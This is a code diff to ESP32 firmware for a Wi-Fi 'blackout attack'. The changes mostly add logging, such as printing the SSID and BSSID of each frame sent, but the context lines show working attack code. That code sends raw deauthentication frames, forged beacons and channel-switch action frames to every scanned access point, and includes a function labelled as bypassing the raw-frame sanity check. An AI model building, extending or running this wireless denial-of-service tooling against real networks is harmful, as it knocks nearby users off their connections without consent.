@@ -110,8 +110,12 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
 }
 
 esp_err_t wifi_bring_up() {
-  if (wifi_initialised) return ESP_OK;
+  if (wifi_initialised) {
+    ESP_LOGI(TAG, "Wi-Fi already initialised");
+    return ESP_OK;
+  }
 
+  ESP_LOGI(TAG, "Initializing Wi-Fi subsystem");
   ESP_ERROR_CHECK(esp_netif_init());
   
   // Try to create the default event loop, but ignore if it already exists
@@ -120,22 +124,42 @@ esp_err_t wifi_bring_up() {
     ESP_LOGE(TAG, "Failed to create default event loop: %s", esp_err_to_name(err));
     return err;
   }
+  if (err == ESP_ERR_INVALID_STATE) {
+    ESP_LOGI(TAG, "Event loop already exists");
+  } else {
+    ESP_LOGI(TAG, "Event loop created successfully");
+  }
 
   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  ESP_LOGI(TAG, "Initializing Wi-Fi with default config");
   err = esp_wifi_init(&cfg);
-  if (err != ESP_OK) return err;
+  if (err != ESP_OK) {
+    ESP_LOGE(TAG, "Failed to initialize Wi-Fi: %s", esp_err_to_name(err));
+    return err;
+  }
+  ESP_LOGI(TAG, "Wi-Fi initialized successfully");
 
   // Same mode the original settles on when the radio is not in AP mode.
+  ESP_LOGI(TAG, "Setting Wi-Fi mode to STA");
   err = esp_wifi_set_mode(WIFI_MODE_STA);
-  if (err != ESP_OK) return err;
+  if (err != ESP_OK) {
+    ESP_LOGE(TAG, "Failed to set Wi-Fi mode: %s", esp_err_to_name(err));
+    return err;
+  }
 
+  ESP_LOGI(TAG, "Starting Wi-Fi");
   err = esp_wifi_start();
-  if (err != ESP_OK) return err;
+  if (err != ESP_OK) {
+    ESP_LOGE(TAG, "Failed to start Wi-Fi: %s", esp_err_to_name(err));
+    return err;
+  }
+  ESP_LOGI(TAG, "Wi-Fi started successfully");
 
   // No extra enabling needed for raw injection in ESP-IDF v6:
   // esp_wifi_set_promiscuous_mode() / esp_wifi_set_raw_tx_mode() were private
   // APIs and no longer exist. Raw frames go out via esp_wifi_80211_tx().
   wifi_initialised = true;
+  ESP_LOGI(TAG, "Wi-Fi bring-up completed successfully");
   return ESP_OK;
 }
 
@@ -324,8 +348,14 @@ uint8_t deauth_frame_default[] = {
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00};
 
-void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
+void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size, const char* ssid, const uint8_t* bssid) {
   if (!frame_buffer || size < 24 || size > 1500) return;
+
+  // Print SSID and BSSID information
+  if (ssid && bssid) {
+    ESP_LOGI(TAG, "Sending frame - SSID: %s, BSSID: %02x:%02x:%02x:%02x:%02x:%02x", 
+             ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
+  }
 
   // ESP-IDF v6 exposes raw injection as esp_wifi_80211_tx(). en_sys_seq=false
   // keeps the sequence number from our own frame buffer.
@@ -384,7 +414,8 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(int repeat, uint16_t interval_m
       if (authmode_needs_deauth(target.authmode) ||
           target.authmode == WIFI_AUTH_WPA2_PSK) {
         esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
-        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default), 
+                                   reinterpret_cast<const char*>(g_scan_results[j].ssid), target.bssid);
         frames_sent++;
         sent++;
         if (!operation_stop_requested) vTaskDelay(pdMS_TO_TICKS(1));
@@ -397,7 +428,8 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(int repeat, uint16_t interval_m
             reinterpret_cast<const char *>(g_scan_results[j].ssid), beacon,
             sizeof(beacon));
         if (beacon_len > 0) {
-          wsl_bypasser_send_raw_frame(beacon, static_cast<int>(beacon_len));
+          wsl_bypasser_send_raw_frame(beacon, static_cast<int>(beacon_len), 
+                                     reinterpret_cast<const char*>(g_scan_results[j].ssid), target.bssid);
           frames_sent++;
           sent++;
         }
@@ -406,14 +438,16 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(int repeat, uint16_t interval_m
         size_t action_len = build_csa_action_frame(
             target.bssid, target.channel, decoy, action, sizeof(action));
         if (action_len > 0) {
-          wsl_bypasser_send_raw_frame(action, static_cast<int>(action_len));
+          wsl_bypasser_send_raw_frame(action, static_cast<int>(action_len), 
+                                     reinterpret_cast<const char*>(g_scan_results[j].ssid), target.bssid);
           frames_sent++;
           sent++;
         }
       } else {
         // Unknown or open network: single deauth, no CSA.
         esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
-        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default), 
+                                   reinterpret_cast<const char*>(g_scan_results[j].ssid), target.bssid);
         frames_sent++;
         sent++;
         if (!operation_stop_requested) vTaskDelay(pdMS_TO_TICKS(1));
@@ -562,14 +596,20 @@ void blackout_attack_task(void *) {
 // driven by xyzBegin() / xyzEnd().
 // ---------------------------------------------------------------------------
 bool start_blackout() {
-  if (blackout_attack_active || blackout_attack_task_handle != nullptr) return true;
+  ESP_LOGI(TAG, "Starting blackout attack");
+  if (blackout_attack_active || blackout_attack_task_handle != nullptr) {
+    ESP_LOGI(TAG, "Blackout attack already active");
+    return true;
+  }
 
+  ESP_LOGI(TAG, "Ensuring Wi-Fi mode");
   if (!ensure_wifi_mode()) {
     start_failed = true;
     snprintf(start_error, sizeof(start_error), "ensure_wifi_mode failed");
     ESP_LOGE(TAG, "%s", start_error);
     return false;
   }
+  ESP_LOGI(TAG, "Wi-Fi mode ensured successfully");
 
   // Scan completion callback, registered before the first scan starts, exactly
   // as the original registers its WIFI_EVENT_SCAN_DONE handler.
@@ -634,8 +674,15 @@ void xyzBegin() { start_blackout(); }
 void xyzEnd() { stop_blackout(); }
 
 bool xyzTick() {
-  if (start_failed) return false;
-  return blackout_attack_active || blackout_attack_task_handle != nullptr;
+  ESP_LOGI(TAG, "xyzTick called - start_failed: %d, blackout_attack_active: %d, blackout_attack_task_handle: %p", 
+           start_failed, blackout_attack_active, blackout_attack_task_handle);
+  if (start_failed) {
+    ESP_LOGI(TAG, "xyzTick returning false due to start_failed");
+    return false;
+  }
+  bool result = blackout_attack_active || blackout_attack_task_handle != nullptr;
+  ESP_LOGI(TAG, "xyzTick returning: %d", result);
+  return result;
 }
 
 bool xyzAttackActive() {
